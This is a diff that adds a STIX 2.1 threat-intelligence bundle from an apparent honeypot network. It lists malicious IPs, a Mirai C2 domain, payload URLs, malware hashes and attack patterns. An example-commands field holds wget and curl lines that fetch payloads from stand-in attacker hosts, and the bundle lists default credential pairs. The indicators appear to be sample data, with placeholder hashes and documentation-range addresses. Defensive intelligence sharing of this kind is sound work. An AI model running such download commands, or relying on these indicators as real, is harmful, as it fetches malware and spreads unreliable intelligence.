@@ -1,0 +1,478 @@
+{
+  "type": "bundle",
+  "id": "bundle--5d0092c5-5f74-4287-9642-33f4c354e56d",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "identity",
+      "id": "identity--honeypot-infrastructure-01",
+      "spec_version": "2.1",
+      "created": "2024-01-22T14:30:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "Honeypot Threat Intelligence Infrastructure",
+      "description": "T-Pot honeypot network collecting threat intelligence from SSH, Telnet, HTTP, FTP, SMB, and other protocols",
+      "identity_class": "system",
+      "sectors": [
+        "technology",
+        "cybersecurity"
+      ],
+      "contact_information": "honeypot-intel@example.com"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--ip-192-0-2-1",
+      "spec_version": "2.1",
+      "created": "2024-01-15T08:23:15.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "Malicious IP: 192.0.2.1",
+      "description": "Chinese IP address conducting SSH/HTTP brute force attacks. Observed 127 attack sessions across 7 days. Associated with Chinanet (AS4134).",
+      "indicator_types": [
+        "malicious-activity",
+        "anomalous-activity"
+      ],
+      "pattern": "[ipv4-addr:value = '192.0.2.1']",
+      "pattern_type": "stix",
+      "valid_from": "2024-01-15T08:23:15.000Z",
+      "valid_until": "2024-04-15T08:23:15.000Z",
+      "created_by_ref": "identity--honeypot-infrastructure-01",
+      "labels": [
+        "brute-force",
+        "reconnaissance",
+        "china",
+        "ssh-attack"
+      ],
+      "confidence": 85,
+      "lang": "en",
+      "external_references": [
+        {
+          "source_name": "honeypot-cowrie",
+          "description": "Cowrie SSH honeypot logs"
+        },
+        {
+          "source_name": "honeypot-dionaea",
+          "description": "Dionaea multi-protocol honeypot logs"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--tlp-amber"
+      ],
+      "x_threat_score": 75,
+      "x_attack_count": 127,
+      "x_first_seen": "2024-01-15T08:23:15.000Z",
+      "x_last_seen": "2024-01-22T11:45:30.000Z",
+      "x_protocols": ["ssh", "http"],
+      "x_honeypots": ["cowrie", "dionaea"],
+      "x_geoip": {
+        "country": "China",
+        "city": "Beijing",
+        "latitude": 39.9042,
+        "longitude": 116.4074,
+        "asn": "AS4134 Chinanet"
+      }
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--ip-198-51-100-42",
+      "spec_version": "2.1",
+      "created": "2024-01-16T03:12:45.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "Malicious IP: 198.51.100.42",
+      "description": "US-based IP conducting SSH brute force attacks. 89 attack sessions detected. Associated with Google LLC infrastructure (AS15169).",
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "pattern": "[ipv4-addr:value = '198.51.100.42']",
+      "pattern_type": "stix",
+      "valid_from": "2024-01-16T03:12:45.000Z",
+      "valid_until": "2024-04-16T03:12:45.000Z",
+      "created_by_ref": "identity--honeypot-infrastructure-01",
+      "labels": [
+        "brute-force",
+        "ssh-attack",
+        "cloud-infrastructure"
+      ],
+      "confidence": 72,
+      "external_references": [
+        {
+          "source_name": "honeypot-cowrie",
+          "description": "Cowrie SSH honeypot logs"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--tlp-amber"
+      ],
+      "x_threat_score": 65,
+      "x_attack_count": 89,
+      "x_first_seen": "2024-01-16T03:12:45.000Z",
+      "x_last_seen": "2024-01-22T09:30:20.000Z",
+      "x_protocols": ["ssh"],
+      "x_geoip": {
+        "country": "United States",
+        "city": "New York",
+        "asn": "AS15169 Google LLC"
+      }
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--domain-malicious-c2",
+      "spec_version": "2.1",
+      "created": "2024-01-16T10:30:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "C2 Domain: malicious-c2.example.com",
+      "description": "Command and control domain distributing malware payloads. Observed serving payload.sh and bot.bin. 23 download attempts detected.",
+      "indicator_types": [
+        "malicious-activity",
+        "command-and-control"
+      ],
+      "pattern": "[domain-name:value = 'malicious-c2.example.com']",
+      "pattern_type": "stix",
+      "valid_from": "2024-01-16T10:30:00.000Z",
+      "valid_until": "2024-04-16T10:30:00.000Z",
+      "created_by_ref": "identity--honeypot-infrastructure-01",
+      "labels": [
+        "c2",
+        "malware-distribution",
+        "mirai-botnet"
+      ],
+      "confidence": 90,
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "command-and-control"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--tlp-red"
+      ],
+      "x_request_count": 23,
+      "x_associated_urls": [
+        "http://malicious-c2.example.com/payload.sh",
+        "http://malicious-c2.example.com/bot.bin"
+      ]
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--url-payload",
+      "spec_version": "2.1",
+      "created": "2024-01-16T10:30:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "Malicious URL: payload.sh",
+      "description": "Shell script payload downloaded 12 times. Associated with Mirai botnet infrastructure.",
+      "indicator_types": [
+        "malicious-activity",
+        "malware-download"
+      ],
+      "pattern": "[url:value = 'http://malicious-c2.example.com/payload.sh']",
+      "pattern_type": "stix",
+      "valid_from": "2024-01-16T10:30:00.000Z",
+      "valid_until": "2024-04-16T10:30:00.000Z",
+      "created_by_ref": "identity--honeypot-infrastructure-01",
+      "labels": [
+        "malware",
+        "mirai",
+        "shell-script"
+      ],
+      "confidence": 90,
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "execution"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--tlp-red"
+      ],
+      "x_download_count": 12,
+      "x_method": "GET"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--hash-mirai-bot",
+      "spec_version": "2.1",
+      "created": "2024-01-17T09:45:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "Mirai Bot Malware",
+      "description": "Mirai botnet malware binary. MD5: 5d41402abc4b2a76b9719d911017c592. Downloaded from malicious-c2.example.com.",
+      "indicator_types": [
+        "malicious-activity",
+        "malware-sample"
+      ],
+      "pattern": "[file:hashes.MD5 = '5d41402abc4b2a76b9719d911017c592']",
+      "pattern_type": "stix",
+      "valid_from": "2024-01-17T09:45:00.000Z",
+      "valid_until": "2025-01-17T09:45:00.000Z",
+      "created_by_ref": "identity--honeypot-infrastructure-01",
+      "labels": [
+        "malware",
+        "mirai",
+        "botnet",
+        "iot-malware"
+      ],
+      "confidence": 95,
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "execution"
+        },
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "persistence"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--tlp-red"
+      ],
+      "x_filename": "mirai.bot",
+      "x_source_url": "http://malicious-c2.example.com/bot.bin",
+      "x_download_count": 8,
+      "x_malware_family": "mirai"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--hash-xmrig",
+      "spec_version": "2.1",
+      "created": "2024-01-19T15:20:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "XMRig Cryptominer",
+      "description": "XMRig cryptocurrency miner. SHA256: 2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
+      "indicator_types": [
+        "malicious-activity",
+        "malware-sample"
+      ],
+      "pattern": "[file:hashes.'SHA-256' = '2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae']",
+      "pattern_type": "stix",
+      "valid_from": "2024-01-19T15:20:00.000Z",
+      "valid_until": "2025-01-19T15:20:00.000Z",
+      "created_by_ref": "identity--honeypot-infrastructure-01",
+      "labels": [
+        "malware",
+        "cryptominer",
+        "xmrig",
+        "monero"
+      ],
+      "confidence": 92,
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "impact"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--tlp-red"
+      ],
+      "x_filename": "xmrig_miner",
+      "x_source_url": "http://mining-pool.example.org/xmrig",
+      "x_download_count": 5,
+      "x_malware_family": "xmrig"
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--brute-force",
+      "spec_version": "2.1",
+      "created": "2024-01-22T14:30:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "SSH/Telnet Brute Force",
+      "description": "Automated brute force attacks against SSH and Telnet services using common credential lists",
+      "created_by_ref": "identity--honeypot-infrastructure-01",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1110",
+          "url": "https://attack.mitre.org/techniques/T1110"
+        }
+      ],
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "credential-access"
+        }
+      ],
+      "x_observed_count": 289,
+      "x_top_credentials": [
+        "root:root",
+        "admin:admin",
+        "admin:123456"
+      ]
+    },
+    {
+      "type": "attack-pattern",
+      "id": "attack-pattern--tool-transfer",
+      "spec_version": "2.1",
+      "created": "2024-01-22T14:30:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "Ingress Tool Transfer",
+      "description": "Downloading malware payloads and tools using wget/curl commands",
+      "created_by_ref": "identity--honeypot-infrastructure-01",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1105",
+          "url": "https://attack.mitre.org/techniques/T1105"
+        }
+      ],
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "command-and-control"
+        }
+      ],
+      "x_observed_count": 23,
+      "x_example_commands": [
+        "wget http://malicious-c2.example.com/payload.sh",
+        "curl -O http://exploit-kit.example.net/bot.bin"
+      ]
+    },
+    {
+      "type": "malware",
+      "id": "malware--mirai",
+      "spec_version": "2.1",
+      "created": "2024-01-17T14:00:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "Mirai Botnet",
+      "description": "Mirai IoT botnet variant. Observed targeting SSH/Telnet services with brute force attacks, then deploying bot binary.",
+      "malware_types": [
+        "bot",
+        "remote-access-trojan"
+      ],
+      "is_family": true,
+      "created_by_ref": "identity--honeypot-infrastructure-01",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "initial-access"
+        },
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "execution"
+        },
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "persistence"
+        }
+      ],
+      "labels": [
+        "iot-malware",
+        "ddos-bot"
+      ],
+      "x_observed_count": 23,
+      "x_sample_hash": "5d41402abc4b2a76b9719d911017c592"
+    },
+    {
+      "type": "malware",
+      "id": "malware--xmrig",
+      "spec_version": "2.1",
+      "created": "2024-01-19T15:20:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "XMRig Cryptominer",
+      "description": "XMRig cryptocurrency miner targeting Linux servers. Mines Monero (XMR) using compromised system resources.",
+      "malware_types": [
+        "resource-exploitation"
+      ],
+      "is_family": true,
+      "created_by_ref": "identity--honeypot-infrastructure-01",
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "impact"
+        }
+      ],
+      "labels": [
+        "cryptominer",
+        "monero"
+      ],
+      "x_observed_count": 5,
+      "x_sample_hash": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"
+    },
+    {
+      "type": "threat-actor",
+      "id": "threat-actor--mirai-operator",
+      "spec_version": "2.1",
+      "created": "2024-01-22T14:30:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "name": "Mirai Botnet Operator",
+      "description": "Threat actor operating Mirai botnet variant, targeting IoT devices and Linux servers via SSH/Telnet brute force",
+      "threat_actor_types": [
+        "cybercriminal"
+      ],
+      "aliases": [
+        "Mirai Gang"
+      ],
+      "first_seen": "2024-01-17T14:00:00.000Z",
+      "last_seen": "2024-01-22T11:45:30.000Z",
+      "goals": [
+        "botnet-recruitment",
+        "ddos-capability"
+      ],
+      "sophistication": "intermediate",
+      "resource_level": "individual",
+      "primary_motivation": "financial-gain",
+      "created_by_ref": "identity--honeypot-infrastructure-01"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--mirai-uses-domain",
+      "spec_version": "2.1",
+      "created": "2024-01-22T14:30:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "relationship_type": "uses",
+      "source_ref": "malware--mirai",
+      "target_ref": "indicator--domain-malicious-c2",
+      "created_by_ref": "identity--honeypot-infrastructure-01"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--mirai-hash",
+      "spec_version": "2.1",
+      "created": "2024-01-22T14:30:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "relationship_type": "sample-of",
+      "source_ref": "indicator--hash-mirai-bot",
+      "target_ref": "malware--mirai",
+      "created_by_ref": "identity--honeypot-infrastructure-01"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--actor-uses-mirai",
+      "spec_version": "2.1",
+      "created": "2024-01-22T14:30:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "relationship_type": "uses",
+      "source_ref": "threat-actor--mirai-operator",
+      "target_ref": "malware--mirai",
+      "created_by_ref": "identity--honeypot-infrastructure-01"
+    },
+    {
+      "type": "relationship",
+      "id": "relationship--ip-indicates-brute-force",
+      "spec_version": "2.1",
+      "created": "2024-01-22T14:30:00.000Z",
+      "modified": "2024-01-22T14:30:00.000Z",
+      "relationship_type": "indicates",
+      "source_ref": "indicator--ip-192-0-2-1",
+      "target_ref": "attack-pattern--brute-force",
+      "created_by_ref": "identity--honeypot-infrastructure-01"
+    },
+    {
+      "type": "marking-definition",
+      "id": "marking-definition--tlp-amber",
+      "spec_version": "2.1",
+      "created": "2024-01-22T14:30:00.000Z",
+      "definition_type": "tlp",
+      "definition": {
+        "tlp": "amber"
+      },
+      "name": "TLP:AMBER"
+    },
+    {
+      "type": "marking-definition",
+      "id": "marking-definition--tlp-red",
+      "spec_version": "2.1",
+      "created": "2024-01-22T14:30:00.000Z",
+      "definition_type": "tlp",
+      "definition": {
+        "tlp": "red"
+      },
+      "name": "TLP:RED"
+    }
+  ]
+}
